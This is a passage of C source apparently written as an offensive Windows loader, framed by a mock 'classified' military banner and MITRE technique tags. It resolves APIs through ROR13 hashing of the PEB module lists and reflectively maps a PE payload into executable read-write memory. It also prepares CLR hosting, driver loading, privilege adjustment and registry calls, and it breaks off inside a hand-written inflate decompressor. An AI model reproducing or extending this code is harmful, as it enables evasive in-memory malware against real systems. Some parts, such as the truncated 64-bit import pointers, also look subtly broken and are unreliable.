/*
 * 🛡️ C4ISR-STRATCOM: SIGINT-V5
 * [CLASSIFIED]: CONFIDENCIAL
 * [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
 * [TACTIC]: TA0002_Execution
 * [TECHNIQUE]: T1106_Native_API
 */
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "mscoree.lib")

#define CLSID_CLRMetaHost    {0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}}
#define IID_ICLRMetaHost     {0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0xB1}}
#define IID_ICLRRuntimeInfo  {0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}}
#define IID_ICorrRuntimeHost {0xCB2F6723, 0xAB3A, 0x11d2, {0x9C, 0x40, 0x00, 0xC0, 0x4F, 0xA3, 0x0A, 0x3E}}

#define HASH_KERNEL32             0x6A4ABC5B
#define HASH_NTDLL                0x3CFA685D
#define HASH_VIRTUALALLOC         0xEC0E4E8E
#define HASH_LOADLIBRARYA         0x7C0DFCAA
#define HASH_GETPROCADDRESS       0x91AFCA54
#define HASH_NTFLUSHVIRTUALMEMORY 0x534C0AB8

#define IMAGE_DIRECTORY_ENTRY_BASERELOC  5
#define IMAGE_DIRECTORY_ENTRY_IMPORT     1

#define IMAGE_REL_BASED_ABSOLUTE        0
#define IMAGE_REL_BASED_HIGH            1
#define IMAGE_REL_BASED_LOW             2
#define IMAGE_REL_BASED_HIGHLOW         3
#define IMAGE_REL_BASED_DIR64           10

#define DEFLATE_BLOCK_FINAL     1
#define DEFLATE_BLOCK_TYPE_BITS 3

#define ZLIB_ADLER32_MOD    65521
#define ZLIB_BLOCK_SIZE     5552

typedef enum _DEFLATE_STATE {
    DEFLATE_STATE_INIT = 0,
    DEFLATE_STATE_HEADER_CMF,
    DEFLATE_STATE_HEADER_FLG,
    DEFLATE_STATE_BLOCK_HEADER,
    DEFLATE_STATE_UNCOMPRESSED_LEN,
    DEFLATE_STATE_UNCOMPRESSED_DATA,
    DEFLATE_STATE_FIXED_HUFFMAN,
    DEFLATE_STATE_DYNAMIC_HUFFMAN,
    DEFLATE_STATE_DECODE_LITERAL,
    DEFLATE_STATE_DECODE_LENGTH,
    DEFLATE_STATE_DECODE_DISTANCE,
    DEFLATE_STATE_COPY_DATA,
    DEFLATE_STATE_CHECKSUM,
    DEFLATE_STATE_DONE,
    DEFLATE_STATE_ERROR
} DEFLATE_STATE;

typedef struct _DEFLATE_CONTEXT {
    DEFLATE_STATE State;
    uint64_t BitBuffer;
    uint32_t BitCount;
    uint32_t CompressionMethod;
    uint32_t CompressionFlags;
    uint32_t WindowSize;
    uint32_t Adler32Low;
    uint32_t Adler32High;
    uint32_t ExpectedAdler32;
    uint32_t HasChecksum;
    uint32_t BlockType;
    uint32_t IsFinalBlock;
    uint32_t LiteralLengthCodes;
    uint32_t DistanceCodes;
    uint32_t CodeLengthCodes;
    uint32_t UncompressedLength;
    uint32_t UncompressedNLen;
    uint32_t LengthCode;
    uint32_t LengthValue;
    uint32_t DistanceCode;
    uint32_t DistanceValue;
    uint32_t OutputPosition;
    uint8_t CodeLengths[320];
    uint8_t CodeLengthOrder[19];
    uint16_t LiteralTree[1024];
    uint16_t DistanceTree[1024];
    uint16_t CodeLengthTree[64];
} DEFLATE_CONTEXT, *PDEFLATE_CONTEXT;

typedef struct _PEB_LOADER_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LOADER_DATA, *PPEB_LOADER_DATA;

typedef struct _PEB_MODULE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} PEB_MODULE_ENTRY, *PPEB_MODULE_ENTRY;

typedef struct _PEB64 {
    BYTE InheritedAddressSpace;
    BYTE ReadImageFileExecOptions;
    BYTE BeingDebugged;
    BYTE BitField;
    ULONG Padding0;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LOADER_DATA Ldr;
} PEB64, *PPEB64;

typedef struct _BASE_RELOCATION_BLOCK {
    ULONG PageRVA;
    ULONG BlockSize;
    USHORT TypeOffset[1];
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct _IMPORT_DESCRIPTOR {
    union {
        ULONG Characteristics;
        ULONG OriginalFirstThunk;
    };
    ULONG TimeDateStamp;
    ULONG ForwarderChain;
    ULONG Name;
    ULONG FirstThunk;
} IMPORT_DESCRIPTOR, *PIMPORT_DESCRIPTOR;

typedef struct _IMPORT_BY_NAME {
    USHORT Hint;
    CHAR Name[1];
} IMPORT_BY_NAME, *PIMPORT_BY_NAME;

typedef HRESULT (WINAPI *PFN_CLRCreateInstance)(REFCLSID clsid, REFIID riid, LPVOID *ppInterface);
typedef PVOID  (WINAPI *PFN_VirtualAlloc)(PVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef HMODULE(WINAPI *PFN_LoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC(WINAPI *PFN_GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef NTSTATUS(NTAPI *PFN_NtFlushVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG *FlushSize, ULONG Unknown);
typedef NTSTATUS(NTAPI *PFN_NtLoadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(NTAPI *PFN_NtUnloadDriver)(PUNICODE_STRING DriverServiceName);
typedef VOID     (NTAPI *PFN_RtlInitAnsiString)(PANSI_STRING DestinationString, PCSZ SourceString);
typedef NTSTATUS (NTAPI *PFN_RtlAnsiStringToUnicodeString)(PUNICODE_STRING DestinationString, PCANSI_STRING SourceString, BOOLEAN AllocateDestinationString);
typedef VOID     (NTAPI *PFN_RtlFreeUnicodeString)(PUNICODE_STRING UnicodeString);
typedef BOOL     (WINAPI *PFN_LookupPrivilegeValueA)(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
typedef BOOL     (WINAPI *PFN_OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
typedef BOOL     (WINAPI *PFN_AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
typedef LONG     (WINAPI *PFN_RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
typedef LONG     (WINAPI *PFN_RegCloseKey)(HKEY hKey);
typedef LONG     (WINAPI *PFN_RegCreateKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
typedef LONG     (WINAPI *PFN_RegDeleteKeyA)(HKEY hKey, LPCSTR lpSubKey);
typedef LONG     (WINAPI *PFN_RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
typedef LONG     (WINAPI *PFN_RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);

typedef struct _RESOLVED_KERNEL_APIS {
    PFN_VirtualAlloc    VirtualAlloc;
    PFN_LoadLibraryA    LoadLibraryA;
    PFN_GetProcAddress  GetProcAddress;
    PFN_NtFlushVirtualMemory NtFlushVirtualMemory;
} RESOLVED_KERNEL_APIS, *PRESOLVED_KERNEL_APIS;

typedef struct _RESOLVED_NATIVE_APIS {
    PFN_NtLoadDriver                NtLoadDriver;
    PFN_NtUnloadDriver              NtUnloadDriver;
    PFN_RtlInitAnsiString           RtlInitAnsiString;
    PFN_RtlAnsiStringToUnicodeString RtlAnsiStringToUnicodeString;
    PFN_RtlFreeUnicodeString        RtlFreeUnicodeString;
    PFN_LookupPrivilegeValueA       LookupPrivilegeValueA;
    PFN_OpenProcessToken            OpenProcessToken;
    PFN_AdjustTokenPrivileges       AdjustTokenPrivileges;
    PFN_RegOpenKeyExA               RegOpenKeyExA;
    PFN_RegCloseKey                 RegCloseKey;
    PFN_RegCreateKeyExA             RegCreateKeyExA;
    PFN_RegDeleteKeyA               RegDeleteKeyA;
    PFN_RegQueryValueExA            RegQueryValueExA;
    PFN_RegSetValueExA              RegSetValueExA;
} RESOLVED_NATIVE_APIS, *PRESOLVED_NATIVE_APIS;

typedef struct _CLR_INTERFACES {
    PVOID MetaHost;
    PVOID RuntimeInfo;
    PVOID CorRuntimeHost;
    PVOID AppDomain;
    PVOID Assembly;
    PVOID MethodInfo;
} CLR_INTERFACES, *PCLR_INTERFACES;

typedef struct _FILE_HANDLE {
    HANDLE Handle;
    uint64_t Position;
    uint32_t AccessFlags;
} FILE_HANDLE, *PFILE_HANDLE;

static const CLSID CLSID_CLRMetaHost_Value = CLSID_CLRMetaHost;
static const IID IID_ICLRMetaHost_Value = IID_ICLRMetaHost;
static const IID IID_ICLRRuntimeInfo_Value = IID_ICLRRuntimeInfo;
static const IID IID_ICorrRuntimeHost_Value = IID_ICorrRuntimeHost;

static const uint8_t g_CodeLengthOrder[19] = {16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15};
static const uint8_t g_LengthExtraBits[29] = {0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0};
static const uint16_t g_LengthBase[29] = {3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258};
static const uint8_t g_DistanceExtraBits[30] = {0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13};
static const uint16_t g_DistanceBase[30] = {1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577};

static uint32_t g_Crc32Table[256];
static volatile LONG g_RuntimeLock = 0;
static volatile LONG g_RuntimeState = 0;
static LONG g_RuntimeRefCount = 0;
static HMODULE g_CurrentModule = NULL;
static PVOID g_PayloadData = NULL;
static SIZE_T g_PayloadSize = 0;
static RESOLVED_NATIVE_APIS g_NativeApis = {0};

static VOID InitializeCrc32Table(VOID)
{
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t crc = i;
        for (int j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
        g_Crc32Table[i] = crc;
    }
}

static ULONG ComputeRol13Hash(PCSTR String)
{
    ULONG Hash = 0;
    while (*String) {
        Hash = ((Hash >> 13) | (Hash << 19));
        if ((UCHAR)*String >= 0x61) {
            Hash -= 0x20;
        }
        Hash += (UCHAR)*String;
        String++;
    }
    return Hash;
}

static ULONG ComputeRol13HashW(PCWSTR String, USHORT Length)
{
    ULONG Hash = 0;
    PUCHAR Bytes = (PUCHAR)String;
    ULONG ByteCount = Length * sizeof(WCHAR);
    for (ULONG i = 0; i < ByteCount; i++) {
        Hash = ((Hash >> 13) | (Hash << 19));
        if (Bytes[i] >= 0x61) {
            Hash -= 0x20;
        }
        Hash += Bytes[i];
    }
    return Hash;
}

static uint32_t CalculateAdler32(uint32_t Adler, const uint8_t* Data, size_t Length)
{
    uint32_t Low = Adler & 0xFFFF;
    uint32_t High = (Adler >> 16) & 0xFFFF;
    size_t BlockSize = ZLIB_BLOCK_SIZE;

    while (Length > 0) {
        size_t CurrentBlock = (Length < BlockSize) ? Length : BlockSize;
        Length -= CurrentBlock;

        while (CurrentBlock >= 8) {
            Low += Data[0]; High += Low;
            Low += Data[1]; High += Low;
            Low += Data[2]; High += Low;
            Low += Data[3]; High += Low;
            Low += Data[4]; High += Low;
            Low += Data[5]; High += Low;
            Low += Data[6]; High += Low;
            Low += Data[7]; High += Low;
            Data += 8;
            CurrentBlock -= 8;
        }

        while (CurrentBlock > 0) {
            Low += *Data++;
            High += Low;
            CurrentBlock--;
        }

        Low %= ZLIB_ADLER32_MOD;
        High %= ZLIB_ADLER32_MOD;
    }

    return (High << 16) | Low;
}

static uint32_t CalculateCrc32(uint32_t Crc, const uint8_t* Data, size_t Length)
{
    Crc = ~Crc;
    while (Length >= 4) {
        Crc = g_Crc32Table[(Crc ^ Data[0]) & 0xFF] ^ (Crc >> 8);
        Crc = g_Crc32Table[(Crc ^ Data[1]) & 0xFF] ^ (Crc >> 8);
        Crc = g_Crc32Table[(Crc ^ Data[2]) & 0xFF] ^ (Crc >> 8);
        Crc = g_Crc32Table[(Crc ^ Data[3]) & 0xFF] ^ (Crc >> 8);
        Data += 4;
        Length -= 4;
    }
    while (Length > 0) {
        Crc = g_Crc32Table[(Crc ^ *Data++) & 0xFF] ^ (Crc >> 8);
        Length--;
    }
    return ~Crc;
}

static PVOID GetCurrentImageBase(VOID)
{
    PVOID ReturnAddress = _ReturnAddress();
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)((ULONG_PTR)ReturnAddress & ~0xFFF);

    while (DosHeader) {
        if (DosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)DosHeader + DosHeader->e_lfanew);
            if (NtHeaders->Signature == IMAGE_NT_SIGNATURE) {
                if ((ULONG_PTR)NtHeaders - (ULONG_PTR)DosHeader < 0x1000) {
                    return DosHeader;
                }
            }
        }
        DosHeader = (PIMAGE_DOS_HEADER)((ULONG_PTR)DosHeader - 0x1000);
    }
    return NULL;
}

static BOOLEAN ResolveKernelApis(PRESOLVED_KERNEL_APIS ApiTable)
{
    PPEB64 Peb = (PPEB64)__readgsqword(0x60);
    PPEB_LOADER_DATA LoaderData = Peb->Ldr;

    PFN_VirtualAlloc    pVirtualAlloc = NULL;
    PFN_LoadLibraryA    pLoadLibraryA = NULL;
    PFN_GetProcAddress  pGetProcAddress = NULL;
    PFN_NtFlushVirtualMemory pNtFlushVirtualMemory = NULL;

    for (PLIST_ENTRY Entry = LoaderData->InLoadOrderModuleList.Flink;
         Entry != &LoaderData->InLoadOrderModuleList;
         Entry = Entry->Flink) {

        PPEB_MODULE_ENTRY Module = CONTAINING_RECORD(Entry, PEB_MODULE_ENTRY, InLoadOrderLinks);
        ULONG ModuleHash = ComputeRol13HashW(Module->BaseDllName.Buffer, Module->BaseDllName.Length);

        if (ModuleHash == HASH_KERNEL32) {
            PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Module->DllBase;
            PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)DosHeader + DosHeader->e_lfanew);
            ULONG ExportDirRVA = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            PIMAGE_EXPORT_DIRECTORY ExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)DosHeader + ExportDirRVA);

            PULONG AddressOfNames = (PULONG)((ULONG_PTR)DosHeader + ExportDir->AddressOfNames);
            PUSHORT AddressOfNameOrdinals = (PUSHORT)((ULONG_PTR)DosHeader + ExportDir->AddressOfNameOrdinals);
            PULONG AddressOfFunctions = (PULONG)((ULONG_PTR)DosHeader + ExportDir->AddressOfFunctions);

            USHORT FunctionsFound = 3;

            for (ULONG i = 0; i < ExportDir->NumberOfNames && FunctionsFound; i++) {
                PSTR FunctionName = (PSTR)((ULONG_PTR)DosHeader + AddressOfNames[i]);
                ULONG FunctionHash = ComputeRol13Hash(FunctionName);

                if (FunctionHash == HASH_VIRTUALALLOC) {
                    pVirtualAlloc = (PFN_VirtualAlloc)((ULONG_PTR)DosHeader + AddressOfFunctions[AddressOfNameOrdinals[i]]);
                    FunctionsFound--;
                }
                else if (FunctionHash == HASH_LOADLIBRARYA) {
                    pLoadLibraryA = (PFN_LoadLibraryA)((ULONG_PTR)DosHeader + AddressOfFunctions[AddressOfNameOrdinals[i]]);
                    FunctionsFound--;
                }
                else if (FunctionHash == HASH_GETPROCADDRESS) {
                    pGetProcAddress = (PFN_GetProcAddress)((ULONG_PTR)DosHeader + AddressOfFunctions[AddressOfNameOrdinals[i]]);
                    FunctionsFound--;
                }
            }
        }
        else if (ModuleHash == HASH_NTDLL) {
            PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Module->DllBase;
            PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)DosHeader + DosHeader->e_lfanew);
            ULONG ExportDirRVA = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            PIMAGE_EXPORT_DIRECTORY ExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)DosHeader + ExportDirRVA);

            PULONG AddressOfNames = (PULONG)((ULONG_PTR)DosHeader + ExportDir->AddressOfNames);
            PUSHORT AddressOfNameOrdinals = (PUSHORT)((ULONG_PTR)DosHeader + ExportDir->AddressOfNameOrdinals);
            PULONG AddressOfFunctions = (PULONG)((ULONG_PTR)DosHeader + ExportDir->AddressOfFunctions);

            for (ULONG i = 0; i < ExportDir->NumberOfNames; i++) {
                PSTR FunctionName = (PSTR)((ULONG_PTR)DosHeader + AddressOfNames[i]);
                ULONG FunctionHash = ComputeRol13Hash(FunctionName);

                if (FunctionHash == HASH_NTFLUSHVIRTUALMEMORY) {
                    pNtFlushVirtualMemory = (PFN_NtFlushVirtualMemory)((ULONG_PTR)DosHeader + AddressOfFunctions[AddressOfNameOrdinals[i]]);
                    break;
                }
            }
        }

        if (pVirtualAlloc && pLoadLibraryA && pGetProcAddress && pNtFlushVirtualMemory) {
            break;
        }
    }

    if (!pVirtualAlloc || !pLoadLibraryA || !pGetProcAddress || !pNtFlushVirtualMemory) {
        return FALSE;
    }

    ApiTable->VirtualAlloc = pVirtualAlloc;
    ApiTable->LoadLibraryA = pLoadLibraryA;
    ApiTable->GetProcAddress = pGetProcAddress;
    ApiTable->NtFlushVirtualMemory = pNtFlushVirtualMemory;

    return TRUE;
}

static BOOLEAN ResolveNativeApis(PRESOLVED_NATIVE_APIS ApiTable)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hAdvapi32 = GetModuleHandleA("advapi32.dll");

    if (!hNtdll || !hAdvapi32) {
        return FALSE;
    }

    ApiTable->NtLoadDriver = (PFN_NtLoadDriver)GetProcAddress(hNtdll, "NtLoadDriver");
    ApiTable->NtUnloadDriver = (PFN_NtUnloadDriver)GetProcAddress(hNtdll, "NtUnloadDriver");
    ApiTable->RtlInitAnsiString = (PFN_RtlInitAnsiString)GetProcAddress(hNtdll, "RtlInitAnsiString");
    ApiTable->RtlAnsiStringToUnicodeString = (PFN_RtlAnsiStringToUnicodeString)GetProcAddress(hNtdll, "RtlAnsiStringToUnicodeString");
    ApiTable->RtlFreeUnicodeString = (PFN_RtlFreeUnicodeString)GetProcAddress(hNtdll, "RtlFreeUnicodeString");

    ApiTable->LookupPrivilegeValueA = (PFN_LookupPrivilegeValueA)GetProcAddress(hAdvapi32, "LookupPrivilegeValueA");
    ApiTable->OpenProcessToken = (PFN_OpenProcessToken)GetProcAddress(hAdvapi32, "OpenProcessToken");
    ApiTable->AdjustTokenPrivileges = (PFN_AdjustTokenPrivileges)GetProcAddress(hAdvapi32, "AdjustTokenPrivileges");
    ApiTable->RegOpenKeyExA = (PFN_RegOpenKeyExA)GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    ApiTable->RegCloseKey = (PFN_RegCloseKey)GetProcAddress(hAdvapi32, "RegCloseKey");
    ApiTable->RegCreateKeyExA = (PFN_RegCreateKeyExA)GetProcAddress(hAdvapi32, "RegCreateKeyExA");
    ApiTable->RegDeleteKeyA = (PFN_RegDeleteKeyA)GetProcAddress(hAdvapi32, "RegDeleteKeyA");
    ApiTable->RegQueryValueExA = (PFN_RegQueryValueExA)GetProcAddress(hAdvapi32, "RegQueryValueExA");
    ApiTable->RegSetValueExA = (PFN_RegSetValueExA)GetProcAddress(hAdvapi32, "RegSetValueExA");

    return (ApiTable->NtLoadDriver && ApiTable->NtUnloadDriver && ApiTable->RtlInitAnsiString &&
            ApiTable->RtlAnsiStringToUnicodeString && ApiTable->RtlFreeUnicodeString &&
            ApiTable->LookupPrivilegeValueA && ApiTable->OpenProcessToken &&
            ApiTable->AdjustTokenPrivileges && ApiTable->RegOpenKeyExA && ApiTable->RegCloseKey &&
            ApiTable->RegCreateKeyExA && ApiTable->RegDeleteKeyA && ApiTable->RegQueryValueExA &&
            ApiTable->RegSetValueExA);
}

static BOOLEAN ProcessRelocations(PIMAGE_DOS_HEADER MappedImage, ULONG_PTR Delta)
{
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)MappedImage + MappedImage->e_lfanew);

    if (!NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) {
        return TRUE;
    }

    PBASE_RELOCATION_BLOCK RelocBlock = (PBASE_RELOCATION_BLOCK)(
        (ULONG_PTR)MappedImage +
        NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
    );

    ULONG TotalSize = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    while (TotalSize > 0 && RelocBlock->PageRVA) {
        ULONG NumEntries = (RelocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(USHORT);
        PUSHORT TypeOffset = RelocBlock->TypeOffset;

        for (ULONG i = 0; i < NumEntries; i++) {
            USHORT Type = TypeOffset[i] >> 12;
            USHORT Offset = TypeOffset[i] & 0xFFF;
            PVOID Target = (PVOID)((ULONG_PTR)MappedImage + RelocBlock->PageRVA + Offset);

            switch (Type) {
                case IMAGE_REL_BASED_DIR64:
                    *(ULONG_PTR*)Target += Delta;
                    break;
                case IMAGE_REL_BASED_HIGHLOW:
                    *(ULONG*)Target += (ULONG)Delta;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *(USHORT*)Target += HIWORD(Delta);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *(USHORT*)Target += LOWORD(Delta);
                    break;
            }
        }

        TotalSize -= RelocBlock->BlockSize;
        RelocBlock = (PBASE_RELOCATION_BLOCK)((ULONG_PTR)RelocBlock + RelocBlock->BlockSize);
    }

    return TRUE;
}

static BOOLEAN ResolveImports(PIMAGE_DOS_HEADER MappedImage, PRESOLVED_KERNEL_APIS ApiTable)
{
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)MappedImage + MappedImage->e_lfanew);

    if (!NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress) {
        return TRUE;
    }

    PIMPORT_DESCRIPTOR ImportDesc = (PIMPORT_DESCRIPTOR)(
        (ULONG_PTR)MappedImage +
        NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
    );

    while (ImportDesc->Name) {
        PSTR DllName = (PSTR)((ULONG_PTR)MappedImage + ImportDesc->Name);
        HMODULE hModule = ApiTable->LoadLibraryA(DllName);

        if (!hModule) {
            return FALSE;
        }

        PULONG ThunkData = (PULONG)((ULONG_PTR)MappedImage + ImportDesc->FirstThunk);
        PULONG OriginalThunk = ImportDesc->OriginalFirstThunk ?
            (PULONG)((ULONG_PTR)MappedImage + ImportDesc->OriginalFirstThunk) : ThunkData;

        while (*OriginalThunk) {
            FARPROC Function = NULL;

            if (*OriginalThunk & IMAGE_ORDINAL_FLAG) {
                Function = ApiTable->GetProcAddress(hModule, (LPCSTR)(*OriginalThunk & 0xFFFF));
            }
            else {
                PIMPORT_BY_NAME ImportName = (PIMPORT_BY_NAME)((ULONG_PTR)MappedImage + *OriginalThunk);
                Function = ApiTable->GetProcAddress(hModule, ImportName->Name);
            }

            if (!Function) {
                return FALSE;
            }

            *ThunkData = (ULONG)Function;
            ThunkData++;
            OriginalThunk++;
        }

        ImportDesc++;
    }

    return TRUE;
}

static PVOID MapImageFromMemory(PVOID ImageBase, PRESOLVED_KERNEL_APIS ApiTable)
{
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ImageBase;

    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)ImageBase + DosHeader->e_lfanew);

    if (NtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    PVOID MappedBase = ApiTable->VirtualAlloc(
        NULL,
        NtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!MappedBase) {
        return NULL;
    }

    RtlCopyMemory(MappedBase, ImageBase, NtHeaders->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER SectionHeader = IMAGE_FIRST_SECTION(NtHeaders);

    for (USHORT i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
        PVOID SectionSrc = (PVOID)((ULONG_PTR)ImageBase + SectionHeader[i].PointerToRawData);
        PVOID SectionDst = (PVOID)((ULONG_PTR)MappedBase + SectionHeader[i].VirtualAddress);

        if (SectionHeader[i].SizeOfRawData) {
            RtlCopyMemory(SectionDst, SectionSrc, SectionHeader[i].SizeOfRawData);
        }
    }

    ULONG_PTR Delta = (ULONG_PTR)MappedBase - NtHeaders->OptionalHeader.ImageBase;

    ProcessRelocations((PIMAGE_DOS_HEADER)MappedBase, Delta);
    ResolveImports((PIMAGE_DOS_HEADER)MappedBase, ApiTable);

    if (NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) {
        ApiTable->NtFlushVirtualMemory(
            GetCurrentProcess(),
            &MappedBase,
            (PULONG)&NtHeaders->OptionalHeader.SizeOfImage,
            0
        );
    }

    return MappedBase;
}

static int DecompressInflate(PDEFLATE_CONTEXT Context, const uint8_t* Input, size_t* InputSize,
                             uint8_t* Output, uint8_t* OutputEnd, size_t* OutputSize,
                             uint32_t Flags)
{
    const uint8_t* InputPtr = Input;
    const uint8_t* InputEnd = Input + *InputSize;
    uint8_t* OutputPtr = Output;
    uint8_t* WindowStart = Output;
    uint32_t WindowMask = (Flags & 4) ? 0xFFFFFFFF : (uint32_t)(OutputEnd - Output - 1);

    if ((((ULONG_PTR)(OutputEnd + 1) & (ULONG_PTR)WindowMask) != 0) || (Output < Input)) {
        *OutputSize = 0;
        *InputSize = 0;
        return -3;
    }

    uint32_t State = Context->State;
    uint64_t BitBuffer = Context->BitBuffer;
    uint32_t BitCount = Context->BitCount;
    uint32_t LastSymbol = 0;
    uint32_t LastLength = 0;
    uint32_t LastDistance = 0;
    uint64_t OutputPosition = Context->OutputPosition;

    int Result = -1;

    while (1) {
        switch (State) {
            case DEFLATE_STATE_INIT:
                Context->Adler32Low = 1;
                Context->Adler32High = 0;
                Context->CompressionMethod = 0;
                Context->CompressionFlags = 0;
                LastDistance = 0;
                OutputPosition = 0;
                Context->WindowSize = 0;
                LastSymbol = 0;
                LastLength = 0;
                if (Flags & 1) {
                    State = DEFLATE_STATE_HEADER_CMF;
                    continue;
                }

            case DEFLATE_STATE_HEADER_CMF:
                if (InputPtr >= InputEnd) {
                    Result = (Flags & 2) ? 1 : -4;
                    Context->State = DEFLATE_STATE_HEADER_CMF;
                    goto cleanup;
                }
                Context->CompressionMethod = *InputPtr++;
                State = DEFLATE_STATE_HEADER_FLG;

            case DEFLATE_STATE_HEADER_FLG:
                if (InputPtr >= InputEnd) {
                    Result = (Flags & 2) ? 1 : -4;
                    Context->State = DEFLATE_STATE_HEADER_FLG;
                    goto cleanup;
                }
                Context->CompressionFlags = *InputPtr++;

                if (((Context->CompressionMethod * 256 + Context->CompressionFlags) % 31 != 0) ||
                    (Context->CompressionFlags & 0x20) != 0 ||
                    (Context->CompressionMethod & 0x0F) != 8) {
                    LastLength = 1;
                } else {
                    LastLength = 0;
                }

                if (!(Flags & 4)) {
                    uint32_t WindowSize = 1 << ((Context->CompressionMethod >> 4) + 8);
                    if (WindowSize >= 0x8001 || ((ULONG_PTR)(WindowMask + 1) >> ((Context->CompressionMethod >> 4) + 8)) == 0) {
                        LastLength |= 1;
                    }
                }

                if (LastLength != 0) {
                    Result = -1;
                    Context->State = DEFLATE_STATE_ERROR;
                    goto cleanup;
                }
                State = DEFLATE_STATE_BLOCK_HEADER;

            case DEFLATE_STATE_BLOCK_HEADER:
